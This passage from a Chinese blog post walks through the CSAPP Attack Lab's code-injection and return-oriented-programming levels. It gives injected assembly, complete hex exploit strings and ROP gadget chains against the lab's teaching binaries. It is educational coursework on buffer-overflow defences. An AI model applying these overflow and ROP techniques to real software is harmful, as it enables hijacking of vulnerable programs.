+<h2 id="注"><a href="#注" class="headerlink" title="注"></a>注</h2><p>&emsp;&emsp;事实上，不一定是跳转到当前栈顶，可以跳转到rsp~rsp+0x1b处。  可以用倒推法，rsp~rsp+0x27是输入数据，rsp+0x28之后是函数返回地址，需要嵌入注入代码的地址。而当执行getbuf的ret时，栈顶指向rsp+0x28处。（这里的rsp指代读入数据时的栈顶位置）因为我们的注入代码通过pushq将touch2的地址嵌入到栈帧里，而ret之后，栈顶指针+8变成了rsp+30，减去压人的touch2的8位地址，剩下还有0x28个可用字节。而注入代码占13个字节，所以在rsp~rsp+0x1b任意一处注入代码都是可行的(跳转代码需要适时调整）。不过为了方便起见，显然直接在输入数据的rsp处注入代码是最好的。<br>&emsp;&emsp;这一段说的有点乱，大家意会一下就好。 </p>
+<h1 id="Ctarget-level-3"><a href="#Ctarget-level-3" class="headerlink" title="Ctarget-level-3"></a>Ctarget-level-3</h1><h2 id="问题描述-2"><a href="#问题描述-2" class="headerlink" title="问题描述"></a>问题描述</h2><p>已知在touch3内部调用了hexmatch函数，两个函数的具体定义如下：<br>hexmatch:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="number">2</span> <span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function">3 </span>&#123;</span><br><span class="line"><span class="number">4</span> <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line"><span class="number">5</span> <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line"><span class="number">7</span> <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line"><span class="number">8</span> <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="number">9</span> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>touch3:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span> <span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function">12 </span>&#123;</span><br><span class="line"><span class="number">13</span> vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line"><span class="number">15</span> <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line"><span class="number">16</span> validate(<span class="number">3</span>);</span><br><span class="line"><span class="number">17</span> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">18</span> <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line"><span class="number">19</span> fail(<span class="number">3</span>);</span><br><span class="line"><span class="number">20</span> &#125;</span><br><span class="line"><span class="number">21</span> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">22</span> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;要求与level2类似，都是需要将getbuf的返回地址覆盖为touch3的返回地址，并且附带参数。不同的是，这次需要输入自己cookie值的8位ascii编码值，并且将编码值的地址作为参数传入touch3中。  </p>
+<h2 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h2><ol>
+<li>在linux下输入”man ascii”可以看到ascii编码表。</li>
+<li>字符串后面要加上终止符结尾。</li>
+<li>需要将字符串的地址传到%rdi作为touch3的参数。</li>
+<li>当调用hexmatch和strncmp时，栈帧内容可能会被这两个函数的变量覆盖。换句话说，如果把编码值放在getbuf的栈帧内，就有可能（一定会）会被其他函数的值覆盖掉。</li>
+</ol>
+<h2 id="解决思路-2"><a href="#解决思路-2" class="headerlink" title="解决思路"></a>解决思路</h2><p>&emsp;&emsp;仔细观察hexmatch函数，由于下面这行代码的存在，hexmatch可能会分配110个字节的空间，而这110个字节是在栈上分配的！也就是说getbuf的输入内容很可能会被覆盖。那么我们应该把cookie字符串放哪里好呢？一个自然的想法是放在当前rsp栈帧的很后面，保证不会被后面函数申请的栈帧覆盖，然而这很难；第二种选择就是往上覆盖之前函数的栈帧，这样一来地址就确定了，而且不怕被后来的函数覆盖。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;那么接下来就很简单了，生成下面代码的字节码，然后在rsp+0x28处写上touch3的函数地址，在rsp+0x30处写上cookie的16进制表示的ascii值。因为rsp+0x30属于test函数，把字符串放这里不用怕被后面的函数覆盖掉，因为test函数一直没有返回，所以其申请的栈帧一直有效。<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="variable">$0x5561dca8</span>, %rdi</span><br><span class="line">pushq <span class="variable">$0x4018fa</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p>
+<p>最后得到输入的字节码：<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">48 </span>c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span> fa <span class="number">18</span> </span><br><span class="line"><span class="symbol">40 </span><span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="symbol">78 </span>dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="symbol">35 </span><span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="number">00</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="Rtarget-level-1"><a href="#Rtarget-level-1" class="headerlink" title="Rtarget-level-1"></a>Rtarget-level-1</h1><p>Rtarget的程序加入了以下两项保护措施，无法像ctarget一样直接定位栈帧位置。</p>
+<ul>
+<li>栈随即初始化，每次运行栈地址都不确定，不能再像上面一样，通过修改固定栈位置的值来改变函数跳转的地址。</li>
+<li>栈内部的代码不允许执行。</li>
+</ul>
+<h2 id="问题描述-3"><a href="#问题描述-3" class="headerlink" title="问题描述"></a>问题描述</h2><p>&emsp;&emsp;和Ctarget-level-2的问题一样，覆盖getbuf的返回地址跳转到touch2处，并且输入自己的cookie值作为touch2的函数参数。不同的是，这里要求使用ROP方式。    </p>
+<p>&emsp;&emsp;因为这里使用了栈随机化，程序每次运行的栈位置都不一样，不想用ROP也不行。  </p>
+<h2 id="解决思路-3"><a href="#解决思路-3" class="headerlink" title="解决思路"></a>解决思路</h2><p>首先反汇编rtarget，并且找到start_farm至end_farm处的代码（节选）：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a<span class="number">0</span> &lt;addval_<span class="number">273</span>&gt;:</span><br><span class="line">  <span class="number">4019</span>a<span class="number">0</span>:	<span class="number">8</span>d <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> <span class="keyword">c</span><span class="number">7</span> <span class="keyword">c</span><span class="number">3</span>    	lea    <span class="number">-0</span><span class="keyword">x</span><span class="number">3</span><span class="keyword">c</span><span class="number">3876</span>b<span class="number">8</span>(<span class="symbol">%rdi</span>),<span class="symbol">%eax</span></span><br><span class="line">  <span class="number">4019</span>a<span class="number">6</span>:	<span class="keyword">c</span><span class="number">3</span>                   	retq</span><br></pre></td></tr></table></figure></p>
+<p>可以发现，地址0x4019a2处开始48 89 c7 c3恰好构成一条gadget，并且是mov %rax, %rdi。而%rdi正是我们传进touch2的参数。   </p>
+<p>剩下的有两件事：</p>
+<ul>
+<li>第一，将cookie值赋值给%rax。</li>
+<li>第二，跳转到touch2函数。    </li>
+</ul>
+<p>然后我们接着找，看看有没有含有cookie值的字节码。  </p>
+<p><strong>显然找不到！</strong>  </p>
+<p>&emsp;&emsp;对于寄存器间的操作，能找到是正常的。但是对于数字间的赋值操作，找不到也是正常的，因为我们想赋值的数字千变万化，匹配不到很正常。所以对于赋值语句，我们要转换一下思路，不能使用mov语句来赋值，而应该使用别的，不是立即数形式的赋值语句，并且最好还和栈帧有关，因为我们只能在栈帧注入代码，换言之，我们所想要赋的值就保存在栈帧里。  </p>
+<p>&emsp;&emsp;仔细遍历一下指令集，发现popq正好满足我们的要求！popq是将当前rsp的值赋值给某个寄存器，然后rsp+8。  </p>
+<p>&emsp;&emsp;那么就好办了，我们将cookie值注入栈帧中，先是popq给某个寄存器，然后再通过ret跳转到mouv %rax,%rdi语句，然后再通过ret跳转到touch2函数。 </p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a<span class="number">7</span> &lt;addval_<span class="number">219</span>&gt;:</span><br><span class="line">  <span class="number">4019</span>a<span class="number">7</span>:	<span class="number">8</span>d <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>    	lea    <span class="number">-0</span><span class="keyword">x</span><span class="number">6</span>fa<span class="number">78</span>caf(<span class="symbol">%rdi</span>),<span class="symbol">%eax</span></span><br><span class="line">  <span class="number">4019</span>ad:	<span class="keyword">c</span><span class="number">3</span>                   	retq</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;仔细观察代码，发现在0x4019ab有一个gadget，且58是popq %rax，90是nop占位指令，恰好满足我们的要求。  </p>
+<p>&emsp;&emsp;所以栈帧顺序是这样的：</p>
+<ol>
+<li>记录getbuf返回地址的rsp值应该是0x4019ab，用于跳转到popq %rax指令，跳转后rsp+8的值就是popq的值，也即是cookie值。</li>
+<li>在完成popq操作后，rsp再度加8变成rsp+0x10，此时ret返回应该是跳转到mov %rax,%rdi处，所以rsp+16是0x4019a2。</li>
+<li>执行完赋值语句后，程序应该通过ret跳转到touch2函数，所以rsp+0x18处存放到应该是touch2的程序入口地址。  </li>
+</ol>
+<p><img src="Attack-rl2.png" alt="Attack-rl2" title="Attack-rl2"></p>
+<p>代码如下：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    popq</span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    cookie</span><br><span class="line">a3 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov</span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    touch2</span><br></pre></td></tr></table></figure></p>
+<h1 id="Rtarget-level-3"><a href="#Rtarget-level-3" class="headerlink" title="Rtarget-level-3"></a>Rtarget-level-3</h1><h2 id="问题描述-4"><a href="#问题描述-4" class="headerlink" title="问题描述"></a>问题描述</h2><p>&emsp;&emsp;和ctarget-level-3一样，只不过这次用ROP攻击方式。</p>
+<h2 id="解决思路-4"><a href="#解决思路-4" class="headerlink" title="解决思路"></a>解决思路</h2><p>&emsp;&emsp;这题咋一看挺简单的，因为从level2我们就知道了用popq弹出栈帧内容并且赋值给rdi的方法。然而真正处理的时候才发现坑很大。  </p>
+<p>&emsp;&emsp;首先，level3要输入的是字符串的地址，并且这个字符串是9位的！！不是8位的。这时候查表，我们可以找到将rsp赋值给rax的字节码。  </p>
+<p>&emsp;&emsp;然而问题来了，将rsp赋值给rax后，rsp的内容并没有改变，此时ret返回的地址是rsp当前的值，也就是作为touch3参数的cookie值。而接下来ret将会以cookie值作为程序地址跳转，这显然是不行的。  </p>
+<p>&emsp;&emsp;于是我们思考，能不能找到一个语句，在将rsp的内容赋值给rax之后，对rsp的值进行更改？确实有，那就是popq。所以我们的目标是，找到一句rsp赋值语句后接pop的字节码。  </p>
+<p>&emsp;&emsp;然而找不到。此路不通。嗯，接下来，想到秃头也没想到怎么办才好，那就只能谷歌了。  </p>
+<p>仔细观察代码，发现有一句：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span><span class="built_in">d6</span> &lt;<span class="keyword">add_xy&gt;:</span></span><br><span class="line"><span class="keyword"> </span> <span class="number">4019</span><span class="built_in">d6</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">37</span>          	lea    (%rdi,%rsi,<span class="number">1</span>),%rax</span><br><span class="line">  <span class="number">4019</span>da:	<span class="built_in">c3</span>                   	retq</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这就是破局的关键。我们只需要将cookie放在栈帧的最上方，然后计算出一个基址和偏移值，并将基址和偏移值分别赋值给rdi和rsi就能得到cookie的地址，并且将这个地址传递给rax，然后传递给rdi，大功告成。  </p>
+<p>&emsp;&emsp;剩下的问题是，如何赋值给rsi。<br>&emsp;&emsp;查表，没想到这个也要绕路。<br>&emsp;&emsp;先是查到有mov %ecx,%esi，嗯找什么可以赋值给ecx，<br>&emsp;&emsp;然后查到有mov %edx, %ecs，嗯找什么可以复制给edx，<br>&emsp;&emsp;最后查到有mov %eax, %edx，嗯搞定了。  </p>
+<p><img src="Attack-rl3.png" alt="Attack-rl3" title="Attack-rl3"></p>
+<p>最后梳理一下:</p>
+<ol>
+<li>首先将rsp的基址传给rdi，可以将rsp传递给rax再传递给rdi。</li>
+<li>然后通过pop得到偏移值，再将偏移值七绕八拐传递给rsi。</li>
+<li>最后跳转到touch3处，搞定。  </li>
+</ol>
+<p>输入字节码如下：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">cc <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">70</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">13</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="number">00</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="事后"><a href="#事后" class="headerlink" title="事后"></a>事后</h1><p>&emsp;&emsp;完成这个实验，获益匪浅。见识了两种曾经的主流缓冲区溢出破坏方式，加深了我对栈帧空间的理解。希望以后写代码时，我能够以一个更为底层的角度去考虑代码结构，去思考代码的合理性与安全性。</p>
+
+      
+    </div>
+    
+    
+    
+
+	<div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	
+	</div>
+
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2019/05/22/CSAPP-lab3-Attack/">CSAPP-lab3-Attack</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Sworduo 的个人博客">Sworduo</a></p>
+  <p><span>发布时间:</span>2019年05月22日 - 20:05</p>
+  <p><span>最后更新:</span>2019年06月22日 - 19:06</p>
+  <p><span>原始链接:</span><a href="/2019/05/22/CSAPP-lab3-Attack/" title="CSAPP-lab3-Attack">http://sworduo.net/2019/05/22/CSAPP-lab3-Attack/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://sworduo.net/2019/05/22/CSAPP-lab3-Attack/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+      
+	</div>
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>快到碗里来！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="Sworduo 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+	
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/c语言/" rel="tag"># c语言</a>
+          
+            <a href="/tags/CSAPP/" rel="tag"># CSAPP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/22/MIT6-824-LEC04-VMWARE-ft/" rel="next" title="MIT6.824-LEC04-VMWARE-ft">
+                <i class="fa fa-chevron-left"></i> MIT6.824-LEC04-VMWARE-ft
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/29/MIT6-824-LEC05-Raft/" rel="prev" title="MIT6.824-LEC05-Raft">
+                MIT6.824-LEC05-Raft <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+	 
+		<h3> 相关文章：</h3><ul class="related-posts"><li><a href="/2019/03/07/CSAPP-lab1/">CSAPP-lab1-DATALAB</a></li><li><a href="/2019/05/15/CSAPP-lab2/">CSAPP-lab2-BOMB</a></li></ul> 
+	
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/horse.jpg" alt="Sworduo">
+            
+              <p class="site-author-name" itemprop="name">Sworduo</p>
+              <p class="site-description motion-element" itemprop="description">千里之行，始于足下</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sworduo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sworduo@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+		  
+		
+			<div class="links-of-blogroll motion-element links-of-blogroll-block">
+			  <div class="links-of-blogroll-title">
+				<!-- modify icon to fire by szw -->
+				<i class="fa fa-history fa-" aria-hidden="true"></i>
+				近期文章
+			  </div>
+			  <ul class="links-of-blogroll-list">
+				
+				
+				  <li>
+					<a href="/2019/06/21/MIT6-824-lab3-kvservice/" title="MIT6-824-lab3-kvservice" target="_blank">MIT6-824-lab3-kvservice</a>
+				  </li>
+				
+				  <li>
+					<a href="/2019/06/04/MIT6-824-lab2-raft/" title="MIT6.824-lab2-raft" target="_blank">MIT6.824-lab2-raft</a>
+				  </li>
+				
+				  <li>
+					<a href="/2019/05/29/MIT6-824-LEC05-Raft/" title="MIT6.824-LEC05-Raft" target="_blank">MIT6.824-LEC05-Raft</a>
+				  </li>
+				
+				  <li>
+					<a href="/2019/05/22/CSAPP-lab3-Attack/" title="CSAPP-lab3-Attack" target="_blank">CSAPP-lab3-Attack</a>
+				  </li>
+				
+				  <li>
+					<a href="/2019/05/22/MIT6-824-LEC04-VMWARE-ft/" title="MIT6.824-LEC04-VMWARE-ft" target="_blank">MIT6.824-LEC04-VMWARE-ft</a>
+				  </li>
+				
+			  </ul>
+			</div>
+		
+		
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前置知识"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注入代码入侵"><span class="nav-number">1.1.</span> <span class="nav-text">注入代码入侵</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP攻击"><span class="nav-number">1.2.</span> <span class="nav-text">ROP攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ctarget-level-1"><span class="nav-number">2.</span> <span class="nav-text">Ctarget-level-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注意"><span class="nav-number">2.1.</span> <span class="nav-text">注意</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#问题描述"><span class="nav-number">2.2.</span> <span class="nav-text">问题描述</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解决思路"><span class="nav-number">3.</span> <span class="nav-text">解决思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ctarget-level-2"><span class="nav-number">4.</span> <span class="nav-text">Ctarget-level-2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#问题描述-1"><span class="nav-number">4.1.</span> <span class="nav-text">问题描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提示"><span class="nav-number">4.2.</span> <span class="nav-text">提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解决思路-1"><span class="nav-number">4.3.</span> <span class="nav-text">解决思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注"><span class="nav-number">4.4.</span> <span class="nav-text">注</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ctarget-level-3"><span class="nav-number">5.</span> <span class="nav-text">Ctarget-level-3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#问题描述-2"><span class="nav-number">5.1.</span> <span 